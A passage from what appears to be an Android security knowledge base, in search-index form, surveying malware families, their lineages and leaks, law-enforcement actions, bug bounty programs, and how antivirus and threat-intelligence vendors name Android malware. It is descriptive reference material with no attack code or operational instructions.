Xiaomi, etc.), making these stores primary distribution channels for both legitimate apps and malware targeting Chinese users.</p>"},{"location":"industry/security-companies/#apk-modding-cracking-scene","title":"APK Modding / Cracking Scene","text":"<p>Modified APKs (mods) distributed through forums and dedicated sites. Relevant because modded APKs are a malware distribution vector: trojans are injected into popular cracked apps.</p> Platform Type Notes ACMarket Modded app store Distributes modified APKs. Known malware distribution vector. An1.com Modded games Modded Android game distribution. HappyMod Modded app store Modded game APKs. Community uploads. Lucky Patcher Modification tool In-app purchase bypass, ad removal, permission modification. Widely used. Mobilism Forum + APK sharing Cracked/modded APK distribution. Active community. <p>Modded APKs are frequently repackaged with additional payloads (adware, spyware, banking trojans). The user installs a \"cracked\" version of a game or premium app and gets malware bundled in.</p>"},{"location":"industry/security-companies/#bug-bounty-programs","title":"Bug Bounty Programs","text":"<p>Vulnerability disclosure programs specifically relevant to Android security.</p> Program Scope Max Payout Notes Google VRP Android OS, Pixel devices, Google apps $1,000,000 (full exploit chain) Largest mobile bounty. Covers kernel, framework, and app-level bugs. Paid $11.8M total in 2024. Google Mobile VRP First-party Android apps $30,000 (RCE) Separate program for Google-developed Android apps (Maps, YouTube, etc.) Samsung Mobile Security Rewards Samsung devices, Knox, Galaxy Store $1,000,000 Covers One UI, Knox, Samsung-specific drivers and firmware Qualcomm Bug Bounty Snapdragon chipsets, modem, TEE Varies Baseband and TrustZone vulnerabilities. Critical for Android exploit chains. MediaTek PSIRT MediaTek chipsets Varies Second-largest Android chipset vendor"},{"location":"industry/security-companies/#standards-bodies-and-regulators","title":"Standards Bodies and Regulators","text":"<p>Organizations setting mobile security standards and regulations.</p> Organization Standard/Regulation Relevance NIST SP 800-163 (Vetting Mobile Apps), SP 800-124 (Managing Mobile Devices) US government mobile security guidelines ENISA Smartphone Secure Development Guidelines EU mobile security guidance for developers and enterprises EMVCo SBMP (Software-Based Mobile Payments) Certification for mobile payment app security. DexProtector and Verimatrix are EMVCo-certified. PCI SSC PCI MPoC (Mobile Payments on COTS) Standard for accepting payments on commercial off-the-shelf mobile devices OWASP MASVS / MASTG Mobile Application Security Verification Standard and Testing Guide. Industry-standard testing framework. GSMA FS.05, FS.31 Mobile device security guidelines, SIM security standards EU Parliament Cyber Resilience Act (CRA) Mandatory cybersecurity requirements for products with digital elements, including mobile apps. Effective 2027."},{"location":"malware/","title":"Android Malware","text":"<p>The Android malware landscape from its earliest trojans to modern banking malware with full device takeover. This section documents how Android malware works, how it evolved, and the techniques that define each generation.</p>"},{"location":"malware/#structure","title":"Structure","text":"Page Content Timeline Chronological evolution of Android malware: key families, milestones, how techniques spread Naming Conventions How different security vendors name the same malware, and how to map between naming schemes Grayware &amp; Data Harvesting Data broker SDKs, stalkerware, ad fraud, fleeceware, predatory lending apps -- the gray area between aggressive monetization and malware Threat Actors MaaS operators, state-sponsored groups, regional criminal organizations, and solo developers behind Android malware Families Individual write-ups on notable malware families: behaviors, permissions, techniques, packers, IOCs <p>Key Insight</p> <p>Accessibility Service abuse is nearly universal in modern banking trojans and is the single most critical permission for malware operations. It enables overlay injection, keylogging, ATS fraud, screen reading, and self-granted permissions -- making it the foundation that most other attack techniques depend on.</p>"},{"location":"malware/#landscape-overview","title":"Landscape Overview","text":""},{"location":"malware/#by-category","title":"By Category","text":"Category Count Description Banking trojans (MaaS) 25+ Overlay attacks, ATS, VNC/DTO. Sold as subscriptions ($3k--$10k/month) Regional bankers 10+ Single-country targeting with local financial system knowledge SMS/toll fraud 5+ Premium SMS, WAP billing, subscription fraud Spyware/surveillance 15+ State-sponsored and commercial. Screen capture, keylogging, targeted deployment RATs 5+ General-purpose remote access. Builder-based or open-source Supply chain 3+ Malicious SDKs, compromised apps. Dynamic code loading via Play Store Crypto stealers 3+ OCR seed phrase theft, clipboard hijacking"},{"location":"malware/#major-lineages","title":"Major Lineages","text":"<p>Android malware families frequently share code through source leaks, MaaS rebranding, and direct evolution:</p> <pre><code>graph LR\n    Cerberus[\"Cerberus (2019)\"] --&gt;|leak| Alien[\"Alien (2020)\"]\n    Alien --&gt;|fork| Ermac[\"Ermac (2020)\"]\n    Ermac --&gt;|evolve| Hook[\"Hook (2022)\"]\n\n    BankBot[\"BankBot (2016)\"] --&gt;|influence| Anubis[\"Anubis (2018)\"]\n    Anubis --&gt;|leak| GodFather[\"GodFather (2022)\"]\n\n    Exobot[\"Exobot (2016)\"] --&gt; ExobotCompact\n    ExobotCompact --&gt; Coper\n    Coper --&gt; Octo[\"Octo (2022)\"]\n    Octo --&gt; Octo2[\"Octo2 (2024)\"]\n\n    GMBot[\"GM Bot (2014)\"] --&gt;|leak| Overlay[\"overlay technique adopted industry-wide\"]\n\n    BRATA[\"BRATA (2019)\"] --&gt;|evolve| Copybara[\"Copybara (2021)\"]\n    Copybara --&gt; ToxicPanda[\"ToxicPanda (2024)\"]\n\n    CraxRAT --&gt; SpySolr\n    SpySolr --&gt; BTMOB[\"BTMOB RAT (2025)\"]</code></pre>"},{"location":"malware/#2024-2025-trends","title":"2024-2025 Trends","text":"Trend Examples Reduced permission footprints Medusa v2 dropped from 21 to 5 permissions NFC relay attacks NGate, RatOn clone contactless payment cards OCR-based crypto theft SparkCat, SpyAgent scan photos for seed phrases Commercial packer adoption Klopatra, Gigabud use Virbox for anti-analysis On-device virtualization GodFather v3 installs real banking apps inside VirtualApp sandbox Fake lockscreen PIN capture TrickMo, TsarBot steal device PINs via fake lockscreens Human behavior mimicry Herodotus types with natural delays to evade behavioral biometrics Firebase as C2 KoSpy, FireScam, DeVixor use Firebase infrastructure <p>Most Impactful Trend</p> <p>NFC relay attacks represent a paradigm shift -- malware like NGate and RatOn can clone contactless payment cards remotely, bridging the gap between digital compromise and physical-world fraud at ATMs and POS terminals.</p>"},{"location":"malware/#geographic-hotspots","title":"Geographic Hotspots","text":"Region Dominant Families Distribution Europe (Western) Anatsa, Octo, Medusa, Vultur Play Store droppers Europe (Southern) Copybara, Sturnus, Herodotus Vishing (TOAD), smishing Turkey Frogblight, BlankBot, Klopatra Smishing, phishing pages Russia/CIS Mamont, FireScam Fake parcel tracking, fake RuStore Iran DeVixor, DCHSpy Fake VPN apps, automotive phishing South Korea Fakecalls, SoumniBot, SpyAgent Smishing, fake banking apps East Asia MoqHao, FluHorse Smishing (Roaming Mantis), trojanized apps Southeast Asia Gigabud, GoldPickaxe Fake government/banking apps India SpyLoan, regional banking trojans Fake loan apps, MaaS phishing platforms, smishing Latin America PixPirate, ToxicPanda, Zanubis WhatsApp lures, social engineering Middle East GuardZoo, AridSpy Trojanized messaging apps"},{"location":"malware/#detailed-lineage-maps","title":"Detailed Lineage Maps","text":""},{"location":"malware/#banking-trojan-evolution","title":"Banking Trojan Evolution","text":"<p>The banking trojan ecosystem is defined by source code leaks and direct inheritance. The Cerberus leak in September 2020 was the single most impactful event, seeding three successor families.</p> <pre><code>graph TD\n    subgraph Cerberus Lineage\n        Cerberus[\"Cerberus&lt;br/&gt;(2019)\"] --&gt;|\"source leak&lt;br/&gt;Sept 2020\"| Alien[\"Alien&lt;br/&gt;(2020)\"]\n        Alien --&gt;|\"fork by DukeEugene\"| Ermac[\"ERMAC&lt;br/&gt;(2021)\"]\n        Ermac --&gt;|\"evolve + VNC\"| Hook[\"Hook&lt;br/&gt;(2022)\"]\n        Hook --&gt;|\"v2 + WebSocket\"| HookV2[\"Hook v2&lt;br/&gt;(2023)\"]\n    end\n\n    subgraph Exobot Lineage\n        Exobot[\"Exobot&lt;br/&gt;(2016)\"] --&gt;|\"lite version\"| ExobotCompact[\"ExobotCompact&lt;br/&gt;(2019)\"]\n        ExobotCompact --&gt;|\"rebrand\"| Coper[\"Coper&lt;br/&gt;(2021)\"]\n        Coper --&gt;|\"rebrand by ThreatFabric\"| Octo[\"Octo&lt;br/&gt;(2022)\"]\n        Octo --&gt;|\"DGA + encrypted C2\"| Octo2[\"Octo2&lt;br/&gt;(2024)\"]\n    end\n\n    subgraph Anubis Lineage\n        GMBot[\"GM Bot&lt;br/&gt;(2014)\"] --&gt;|\"overlay concept\"| BankBot[\"BankBot&lt;br/&gt;(2016)\"]\n        BankBot --&gt;|\"influenced\"| Anubis[\"Anubis&lt;br/&gt;(2018)\"]\n        Anubis --&gt;|\"source leak 2019\"| GodFather[\"GodFather&lt;br/&gt;(2022)\"]\n        GodFather --&gt;|\"VirtualApp sandbox\"| GodFatherV3[\"GodFather v3&lt;br/&gt;(2024)\"]\n    end\n\n    subgraph BRATA Lineage\n        BRATA[\"BRATA&lt;br/&gt;(2019)\"] --&gt;|\"evolved by same actor\"| Copybara[\"Copybara&lt;br/&gt;(2021)\"]\n        Copybara --&gt;|\"rebranded for LATAM\"| ToxicPanda[\"ToxicPanda&lt;br/&gt;(2024)\"]\n    end\n\n    subgraph Independent Lines\n        Medusa1[\"Medusa v1&lt;br/&gt;(2020)\"] --&gt;|\"reduced permissions\"| Medusa2[\"Medusa v2&lt;br/&gt;(2024)\"]\n        Xeno1[\"Xenomorph v1&lt;br/&gt;(2022)\"] --&gt;|\"added ATS\"| Xeno2[\"Xenomorph v2\"] --&gt;|\"ATS engine\"| Xeno3[\"Xenomorph v3&lt;br/&gt;(2023)\"]\n        Vultur1[\"Vultur v1&lt;br/&gt;(2021)\"] --&gt;|\"added screen streaming\"| Vultur2[\"Vultur v2&lt;br/&gt;(2024)\"]\n        CraxRAT --&gt; SpySolr --&gt; BTMOB[\"BTMOB RAT&lt;br/&gt;(2025)\"]\n    end</code></pre>"},{"location":"malware/#spyware-evolution","title":"Spyware Evolution","text":"<p>Commercial and state-sponsored spyware follows a different lifecycle. Distribution is targeted (not mass), capabilities are deeper (kernel-level), and operators face legal consequences.</p> <pre><code>graph TD\n    subgraph Commercial Spyware\n        FinSpy[\"FinSpy&lt;br/&gt;(2012, FinFisher)\"] --&gt;|\"bankrupt 2022\"| FinSpyEnd[\"Operations ceased\"]\n        Pegasus[\"Pegasus&lt;br/&gt;(2016, NSO Group)\"] --&gt;|\"ongoing\"| PegasusCurrent[\"Active&lt;br/&gt;zero-click exploits\"]\n        Predator[\"Predator&lt;br/&gt;(2019, Cytrox)\"] --&gt;|\"Intellexa consortium\"| PredSanctions[\"US sanctions&lt;br/&gt;March 2024\"]\n        PredSanctions --&gt;|\"fragmented ops\"| PredContinue[\"Infrastructure rotating\"]\n        Hermit[\"Hermit&lt;br/&gt;(2019, RCS Lab)\"] --&gt;|\"ISP-level delivery\"| HermitActive[\"Active in Italy, Kazakhstan\"]\n    end\n\n    subgraph State-Sponsored\n        APT41[\"APT41&lt;br/&gt;(China)\"] --&gt;|\"cross-platform\"| LightSpy[\"LightSpy&lt;br/&gt;(2020)\"]\n        LightSpy --&gt;|\"14+ plugins\"| LightSpyV2[\"LightSpy v2&lt;br/&gt;(2024)\"]\n        ScarCruft[\"ScarCruft/APT37&lt;br/&gt;(DPRK)\"] --&gt; KoSpy[\"KoSpy&lt;br/&gt;(2024)\"]\n        Gamaredon[\"Gamaredon/Sandcat&lt;br/&gt;(Russia)\"] --&gt; BoneSpy[\"BoneSpy&lt;br/&gt;(2021)\"]\n        Gamaredon --&gt; PlainGnome[\"PlainGnome&lt;br/&gt;(2024)\"]\n    end</code></pre>"},{"location":"malware/#sms-worm-and-toll-fraud","title":"SMS Worm and Toll Fraud","text":"<p>SMS-based malware peaked around 2020-2022 with FluBot's worm-like spreading mechanism. Law enforcement intervention proved effective in this category.</p> <pre><code>graph LR\n    FluBot[\"FluBot&lt;br/&gt;(2020)\"] --&gt;|\"SMS worm spread&lt;br/&gt;across Europe\"| FluBotPeak[\"Peak: 2021&lt;br/&gt;11 countries\"]\n    FluBotPeak --&gt;|\"Europol takedown&lt;br/&gt;June 2022\"| FluBotEnd[\"Dead\"]\n\n    Joker[\"Joker&lt;br/&gt;(2017)\"] --&gt;|\"continuous&lt;br/&gt;Play Store presence\"| JokerOngoing[\"Active&lt;br/&gt;1,700+ variants\"]\n\n    MoqHao[\"MoqHao&lt;br/&gt;(2018, Roaming Mantis)\"] --&gt;|\"expanded to&lt;br/&gt;27 languages\"| MoqHaoV2[\"Auto-execute&lt;br/&gt;variant (2024)\"]</code></pre>"},{"location":"malware/#source-code-leaks","title":"Source Code Leaks","text":"<p>Source code leaks fundamentally reshape the threat landscape. A single leak can spawn multiple successor families and reduce the barrier to entry for new operators.</p> Date Family What Happened Impact 2017 GM Bot Source leaked on underground forums Pioneered overlay technique; code reused across dozens of families 2019 Anubis Source code leaked after developer arrest Enabled GodFather and numerous low-tier forks targeting specific regions Sept 2020 Cerberus Developer failed to auction, released source free on forums Most impactful Android malware leak. Seeded Alien, ERMAC, Hook. ThreatFabric documented the cascade 2021 SpyNote Builder leaked publicly Explosion of SpyNote variants; accessible to low-skill operators. Zimperium tracked post-leak proliferation 2022 BRATA Partial source circulated Influenced Copybara development 2023 Rafel RAT Open-source release Check Point documented 120+ campaigns across 10 threat actors using Rafel RAT 2024 CraxRAT Builder sold then leaked Led to SpySolr fork, then BTMOB RAT"},{"location":"malware/#law-enforcement-actions","title":"Law Enforcement Actions","text":"<p>Law enforcement actions against mobile malware are rare but impactful when they occur. Most \"takedowns\" are Google removing apps from the Play Store after vendor publications.</p> Date Operation Target Outcome Source June 2022 Europol/Dutch Police FluBot infrastructure Infrastructure seized across 11 countries. FluBot did not resurface. One of the most successful mobile malware takedowns. Europol 2022 German authorities FinFisher GmbH FinSpy vendor filed bankruptcy after investigation into sales to authoritarian regimes. Operations ceased. Netzpolitik.org March 2024 US Treasury OFAC Intellexa Consortium Sanctions on entities and individuals behind Predator spyware. First financial sanctions targeting a commercial spyware vendor. US Treasury March 2024 Joint (FBI/Europol) Blackphone encrypted network Infrastructure used by multiple Android malware operators. Disrupted but not fully dismantled. Europol 2024 Google TAG + Mandiant Predator infrastructure Technical disruption of Predator delivery infrastructure and exploit chains. Intellexa fragmented to new hosting. Google TAG"},{"location":"malware/#by-behavior","title":"By Behavior","text":"<p>Malware families are also cross-referenced from Attack Techniques based on observed behaviors: overlay attacks, accessibility abuse, SMS interception, NFC relay, etc. Permission pages document which families abuse each Android permission.</p>"},{"location":"malware/naming-conventions/","title":"Malware Naming Conventions","text":"<p>There is no universal naming standard for Android malware. Different security vendors independently analyze and name the same malware family, resulting in multiple names for the same threat. This makes cross-referencing research across vendors one of the most tedious parts of mobile threat intelligence.</p>"},{"location":"malware/naming-conventions/#the-problem","title":"The Problem","text":"<p>When a new Android banking trojan appears, each vendor that analyzes it assigns their own name. The name usually sticks if the vendor publishes first, but not always. Some vendors never adopt the common name and use their own detection taxonomy indefinitely.</p>"},{"location":"malware/naming-conventions/#naming-formats-by-vendor-type","title":"Naming Formats by Vendor Type","text":""},{"location":"malware/naming-conventions/#av-engine-detection-names","title":"AV Engine Detection Names","text":"<p>Traditional antivirus engines use a structured format:</p> <pre><code>Platform:Type/Family.Variant\n</code></pre> Vendor Format Example (Cerberus) Bitdefender <code>Android.Trojan.Category.XX</code> <code>Android.Trojan.Banker.VT</code> Dr.Web <code>Android.BankBot.NNNNN</code> <code>Android.BankBot.842</code> ESET <code>Android/Type.Family.XX</code> <code>Android/Spy.Cerberus.A</code> Fortinet <code>Android/Family.A!tr</code> <code>Android/Cerberus.A!tr</code> Kaspersky <code>HEUR:Trojan-Type.AndroidOS.Family.x</code> <code>HEUR:Trojan-Banker.AndroidOS.Cebruser.a</code> McAfee <code>Android/Family.X</code> <code>Android/Cerberus.A</code> Trend Micro <code>AndroidOS_Family.VARIANT</code> <code>AndroidOS_Cerberus.HRX</code> Avast/AVG <code>Android:Family-X [Trj]</code> <code>Android:Cerberus-A [Trj]</code> Symantec/Broadcom <code>Android.Trojan.Family</code> <code>Trojan.Gen.MBT</code> Sophos <code>Andr/Family-X</code> <code>Andr/Cerber-A</code> <p>These names are designed for automated detection, not human communication. They rarely match the research name used in reports. The variant suffix (<code>.A</code>, <code>.B</code>, etc.) increments per sample, not per malware version.</p>"},{"location":"malware/naming-conventions/#complete-virustotal-scanner-list","title":"Complete VirusTotal Scanner List","text":"<p>When submitting an Android APK to VirusTotal, these are all the engines that may produce a detection name. Organized by category to help interpret results.</p>"},{"location":"malware/naming-conventions/#mobile-specific-engines","title":"Mobile-Specific Engines","text":"Engine Android Detection Format Notes AhnLab-V3 <code>Trojan/Android.Banker.NNNNNN</code> Korean AV, strong on Asian malware Avast-Mobile <code>Android:Family-X [Trj]</code> Mobile-specific scanner, same family names as desktop Avast BitDefenderFalx <code>Android.Trojan.Family.XX</code> Bitdefender's mobile engine Symantec Mobile Insight <code>AppRisk:Generisk</code> or family-specific Broadcom's mobile engine, often generic Trustlook <code>Android.PUA.Family</code> Mobile-focused, behavioral detection"},{"location":"malware/naming-conventions/#major-av-engines","title":"Major AV Engines","text":"Engine Android Detection Format Notes Avast <code>Android:Family-X [Trj]</code> Shares engine with AVG AVG <code>Android:Family-X [Trj]</code> Same engine as Avast Avira (no cloud) <code>ANDROID/Family.XXXXX.X</code> Static-only results on VT BitDefender <code>Android.Trojan.Family.XX</code> Licensed by many other engines (eScan, GData, Emsisoft) ClamAV <code>Andr.Trojan.Family-NNNNNNN-0</code> Open source, often behind on mobile DrWeb <code>Android.BankBot.NNNNN</code> Uses numeric IDs, hard to cross-reference ESET-NOD32 <code>Android/Spy.Family.XX</code> Consistent naming, good mobile coverage Fortinet <code>Android/Family.A!tr</code> Suffix indicates type (!tr = trojan, !spy = spyware) GData <code>Android.Trojan.Family.XX</code> Uses Bitdefender engine Kaspersky <code>HEUR:Trojan-Banker.AndroidOS.Family.x</code> Prefix: HEUR (heuristic), UDS (cloud), PDM (behavioral) Malwarebytes <code>Android/Trojan.Banker.Family</code> Good mobile coverage McAfee Scanner <code>Artemis!HASH</code> or <code>Android/Family.X</code> \"Artemis\" = generic cloud detection Microsoft <code>Trojan:AndroidOS/Family.A!MTB</code> <code>!MTB</code> = machine learning, <code>!ml</code> = cloud ML Sophos <code>Andr/Family-X</code> Consistent prefix <code>Andr/</code> Symantec <code>Trojan.Gen.MBT</code> or <code>Android.Reputation.X</code> Often generic, poor family naming Trellix ENS <code>Artemis!HASH</code> Formerly McAfee Enterprise TrendMicro <code>AndroidOS_Family.VARIANT</code> Uppercase variant code TrendMicro-HouseCall <code>AndroidOS_Family.VARIANT</code> Same as TrendMicro WithSecure <code>Trojan:Android/Family.HASH</code> Formerly F-Secure"},{"location":"malware/naming-conventions/#edr-next-gen","title":"EDR / Next-Gen","text":"Engine Android Detection Format Notes CrowdStrike Falcon <code>AndroidOS.Family.XX</code> Behavioral, often lacks family name DeepInstinct <code>MALICIOUS</code> Binary verdict, no family name Elastic <code>Android.Trojan.Family</code> Community rules Palo Alto Networks <code>generic.ml</code> ML-based, usually no family name SentinelOne (Static ML) <code>Static AI - Malicious APK</code> Binary verdict Skyhigh (SWG) <code>BehavesLike.AndroidOS.Malware.xx</code> Behavioral prefix TEHTRIS Generic verdict No family names Trapmine Generic verdict No family names"},{"location":"malware/naming-conventions/#regional-engines","title":"Regional Engines","text":"Engine Region Android Detection Format Alibaba China <code>TrojanBanker:Android/Family.HASH</code> AliCloud China <code>TrojanBanker:Android/Family</code> Antiy-AVL China <code>Trojan/Android.Banker.family</code> Baidu China <code>Android.Trojan.Bank.XX</code> Huorong China <code>Android/Family.X</code> Jiangmin China <code>TrojanBanker.AndroidOS.xx</code> Kingsoft China <code>Android.Troj.Family.x</code> Rising China <code>Trojan.Banker/Android!version</code> Tencent China <code>A.privacy.family.x</code> AhnLab-V3 Korea <code>Trojan/Android.Family.NNNNNN</code> ALYac Korea <code>Trojan.Android.Family</code> ViRobot Korea <code>Android.Family.X</code> TACHYON Korea <code>Trojan-Android/Family</code> Bkav Pro Vietnam <code>Android.Trojan.Family</code> K7AntiVirus India <code>Trojan (XXXXXXXXXX)</code> K7GW India <code>Trojan (XXXXXXXXXX)</code> QuickHeal India <code>Android.Family.GEN</code> Ikarus Austria <code>Trojan-Banker.AndroidOS.Family</code> Zillya Ukraine <code>Trojan.Banker.Android.NNNNN</code>"},{"location":"malware/naming-conventions/#other-engines","title":"Other Engines","text":"Engine Notes Acronis (Static ML) ML-based, generic verdicts Arcabit Uses Bitdefender engine CMC Vietnam, limited mobile coverage CTX Generic detections Cynet Network-focused eScan Uses Bitdefender engine Emsisoft Uses Bitdefender engine Google Google Play Protect verdict Gridinsoft (no cloud) Limited mobile coverage Lionic Limited mobile coverage MaxSecure Limited mobile coverage NANO-Antivirus Russian, numeric detection names Panda <code>Android/Family</code> Sangfor Engine Zero Network security vendor SecureAge ML-based SUPERAntiSpyware Limited mobile coverage Arctic Wolf MDR vendor Varist <code>AndroidOS/Family</code> VBA32 Belarusian, limited mobile VIPRE Uses Bitdefender engine VirIT Italian, limited mobile Webroot Cloud-based, hash verdicts Xcitium Formerly Comodo Yandex Russian, <code>Trojan.AndroidOS.Family</code> ZoneAlarm by Check Point Uses Check Point engine Zoner Czech, limited mobile"},{"location":"malware/naming-conventions/#interpreting-virustotal-results-for-android","title":"Interpreting VirusTotal Results for Android","text":"<p>When analyzing an APK on VirusTotal:</p> <ul> <li>High detection count with varied family names: the engines disagree on the family. Check ThreatFabric, ESET, and Kaspersky names first as they have the best Android coverage.</li> <li>\"Artemis\" or hash-based names: McAfee/Trellix detected it generically via cloud ML. No family attribution.</li> <li>\"Trojan.Gen.MBT\" or \"Android.Reputation\": Symantec generic detection. No useful family info.</li> <li>\"Static AI\" or \"MALICIOUS\": next-gen engines (SentinelOne, DeepInstinct) flagged it but provide no family name.</li> <li>Chinese engine cluster agrees: Tencent, Alibaba, Baidu, Huorong tend to share signatures. If they all name a family, it's worth checking.</li> <li>Only 2-3 engines detect it: either new/zero-day sample, or the sample is packed/obfuscated. Check the \"Details\" tab for packer detection.</li> <li>Bitdefender family detected: eScan, GData, Emsisoft, VIPRE, Arcabit all license Bitdefender's engine, so they'll show the same or similar detection. Don't count them as independent confirmations.</li> </ul>"},{"location":"malware/naming-conventions/#researchthreat-intel-names","title":"Research/Threat Intel Names","text":"<p>Threat intelligence firms assign proper names used in reports and blog posts:</p> Vendor Naming Style Examples ThreatFabric Mythological, original Cerberus, Hydra, Medusa, Anatsa, Hook, Vultur, Xenomorph, Octo Cleafy Uses ThreatFabric names or coins their own Copybara, PixPirate, ToxicPanda, SharkBot, BRATA Group-IB Original names Gustuff, GodFather, GoldDigger Kaspersky Descriptive or campaign-based Roaming Mantis, Harly, SilentFade ESET Descriptive or abbreviated FurBall, FinSpy (uses \"FinSpy\" not FinFisher) McAfee Descriptive, often uses common name Uses widely-adopted names in blogs, detection names differ Proofpoint Sometimes coins alternatives TangleBot (= Medusa) Cyble Uses common names, occasionally original Generally adopts existing names from first publisher Zimperium Original names for their discoveries GriftHorse, Dark Herring, RatMilad Lookout Original or common names Pegasus (Chrysaor for Android), Hermit Citizen Lab Uses vendor names Pegasus, Predator"},{"location":"malware/naming-conventions/#googles-naming","title":"Google's Naming","text":"<p>Google uses its own taxonomy in Android security bulletins and Play Protect communications:</p> <ul> <li>Internal tracking IDs not disclosed publicly</li> <li>Blog posts use generic descriptions (\"potentially harmful application\" / PHA)</li> <li>Google's Android Security team sometimes adopts research names in public talks</li> <li>Android security bulletins reference CVEs, not malware family names</li> <li>Google TAG (Threat Analysis Group) uses vendor names when discussing commercial spyware: Pegasus, Predator, Hermit</li> </ul>"},{"location":"malware/naming-conventions/#cross-vendor-name-mapping","title":"Cross-Vendor Name Mapping","text":"<p>The following table maps the most commonly used name to the names used by major AV vendors and research firms. This is the single most useful reference for cross-referencing threat reports.</p>"},{"location":"malware/naming-conventions/#banking-trojans","title":"Banking Trojans","text":"Common Name McAfee Kaspersky ESET Trend Micro Bitdefender Fortinet Symantec Albiriox - Trojan-Banker.AndroidOS.Albiriox - - Android.Trojan.Banker - - Antidot - Trojan-Banker.AndroidOS.Antidot - - Android.Trojan.Banker - - Anubis Android/Anubis Trojan-Banker.AndroidOS.Anubis Android/Spy.Banker.BSI AndroidOS_Anubis Android.Trojan.Banker Android/Anubis Trojan.Gen.MBT Anatsa Android/Anatsa Trojan-Banker.AndroidOS.Anatsa Android/Spy.Banker.BJK AndroidOS_TeaBot Android.Trojan.Banker Android/Anatsa Android.Reputation.1 BankBot Android/BankBot Trojan-Banker.AndroidOS.Agent Android/Spy.Banker AndroidOS_BankBot Android.Trojan.Banker Android/Agent Trojan.Gen Cerberus Android/Cerberus Trojan-Banker.AndroidOS.Cebruser Android/Spy.Cerberus AndroidOS_Cerberus Android.Trojan.Banker.VT Android/Cerberus Trojan.Gen.MBT Ermac Android/Ermac Trojan-Banker.AndroidOS.Ermac Android/Spy.Banker AndroidOS_Ermac Android.Trojan.Banker Android/Ermac Trojan.Gen.MBT GodFather Android/GodFather Trojan-Banker.AndroidOS.Godfather Android/Spy.Banker AndroidOS_GodFather Android.Trojan.Banker Android/GodFather Trojan.Gen Hook Android/Hook Trojan-Banker.AndroidOS.Hook Android/Spy.Hook AndroidOS_Hook Android.Trojan.Banker Android/Hook Trojan.Gen.MBT Hydra Android/Hydra Trojan-Banker.AndroidOS.Piom Android/Spy.Banker.BRR AndroidOS_Hydra Android.Trojan.Banker Android/Hydra Trojan.Gen.MBT Medusa Android/Medusa Trojan-Banker.AndroidOS.Medusa Android/Spy.Banker AndroidOS_Medusa Android.Trojan.Banker Android/Medusa Trojan.Gen Octo Android/Octo Trojan-Banker.AndroidOS.Coper Android/Spy.Agent.CLR AndroidOS_Coper Android.Trojan.Banker Android/Coper Trojan.Gen.MBT SharkBot Android/SharkBot Trojan-Banker.AndroidOS.Sharkbot Android/Spy.Banker AndroidOS_SharkBot Android.Trojan.Banker Android/SharkBot Trojan.Gen Vultur Android/Vultur Trojan-Banker.AndroidOS.Vultur Android/Spy.Banker AndroidOS_Vultur Android.Trojan.Banker Android/Vultur Trojan.Gen.MBT BingoMod - Trojan-Banker.AndroidOS.BingoMod - - Android.Trojan.Banker - - BlankBot - Trojan-Banker.AndroidOS.BlankBot - - Android.Trojan.Banker - - Brokewell - Trojan-Banker.AndroidOS.Brokewell - - Android.Trojan.Banker - - Crocodilus - Trojan-Banker.AndroidOS.Crocodilus - - Android.Trojan.Banker - - GoldPickaxe - Trojan-Banker.AndroidOS.GoldPickaxe Android/Spy.GoldPickaxe - Android.Trojan.Banker - - Herodotus - Trojan-Banker.AndroidOS.Herodotus - - Android.Trojan.Banker - - Klopatra - Trojan-Banker.AndroidOS.Klopatra - - Android.Trojan.Banker - - NGate - - Android/NGate - - - - RatOn - Trojan-Banker.AndroidOS.RatOn - - - - - Sturnus - Trojan-Banker.AndroidOS.Sturnus - - - - - TrickMo - Trojan-Banker.AndroidOS.TrickMo - - Android.Trojan.Banker - - TsarBot - Trojan-Banker.AndroidOS.TsarBot - - Android.Trojan.Banker - - Xenomorph Android/Xenomorph Trojan-Banker.AndroidOS.Xenomorph Android/Spy.Banker AndroidOS_Xenomorph Android.Trojan.Banker Android/Xenomorph Trojan.Gen"},{"location":"malware/naming-conventions/#fraud-and-sms","title":"Fraud and SMS","text":"Common Name McAfee Kaspersky ESET Trend Micro Joker Android/Joker Trojan.AndroidOS.Joker Android/Joker AndroidOS_Joker FluBot Android/FluBot Trojan-Banker.AndroidOS.Cabassous Android/TrojanDropper.Agent AndroidOS_FluBot Harly Android/Harly Trojan.AndroidOS.Harly Android/Joker AndroidOS_Harly GriftHorse Android/GriftHorse Trojan.AndroidOS.GriftHorse Android/Agent AndroidOS_GriftHorse"},{"location":"malware/naming-conventions/#regional-banking-trojans","title":"Regional Banking Trojans","text":"Common Name McAfee Kaspersky ESET Region Fakecalls Android/Fakecalls Trojan-Banker.AndroidOS.Fakecalls Android/Spy.Banker.Fakecalls South Korea FluHorse - Trojan-Banker.AndroidOS.FluHorse - East Asia (Taiwan, Vietnam) Gigabud - Trojan-Banker.AndroidOS.Gigabud - Southeast Asia Frogblight - Trojan-Banker.AndroidOS.Frogblight Android/Spy.Banker.Frogblight Turkey Mamont - Trojan-Banker.AndroidOS.Mamont Android/Spy.Banker.Mamont Russia MoqHao Android/MoqHao Trojan-Banker.AndroidOS.Wroba Android/TrojanDropper.Agent East Asia SoumniBot Android/Banker.SoumniBot Trojan-Banker.AndroidOS.SoumniBot - South Korea DeVixor - Trojan-Banker.AndroidOS.DeVixor - Iran Zanubis Android/Zanubis Trojan-Banker.AndroidOS.Zanubis Android/Spy.Banker.Zanubis Peru"},{"location":"malware/naming-conventions/#crypto-stealers-and-sdk-malware","title":"Crypto Stealers and SDK Malware","text":"Common Name McAfee Kaspersky ESET Type Goldoson Android/Goldoson AdWare.AndroidOS.Goldoson - Malicious SDK Necro Android/Necro Trojan-Downloader.AndroidOS.Necro Android/TrojanDownloader.Necro Supply chain SparkCat Android/SparkCat Trojan.AndroidOS.SparkCat Android/Spy.SparkCat OCR crypto stealer SpyAgent Android/SpyAgent Trojan-Spy.AndroidOS.SpyAgent - OCR crypto stealer SpyLoan Android/SpyLoan Trojan.AndroidOS.SpyLoan Android/SpyLoan Predatory lending"},{"location":"malware/naming-conventions/#spyware","title":"Spyware","text":"Common Name McAfee Kaspersky ESET Also Known As Mandrake Android/Mandrake Trojan-Spy.AndroidOS.Mandrake Android/Spy.Mandrake - Pegasus Android/Pegasus Trojan-Spy.AndroidOS.Pegasus Android/Spy.Chrysaor Chrysaor (Android variant) Predator Android/Predator Trojan-Spy.AndroidOS.Predator Android/Spy.Agent Alien (loader component) FinSpy Android/FinSpy Trojan-Spy.AndroidOS.FinSpy Android/Spy.FinSpy FinFisher, FinSpy Mobile Hermit Android/Hermit Trojan-Spy.AndroidOS.Hermit Android/Spy.Agent RCS Android SpyNote Android/SpyNote Trojan-Spy.AndroidOS.SpyNote Android/Spy.SpyNote SpyMax, CypherRat KoSpy - 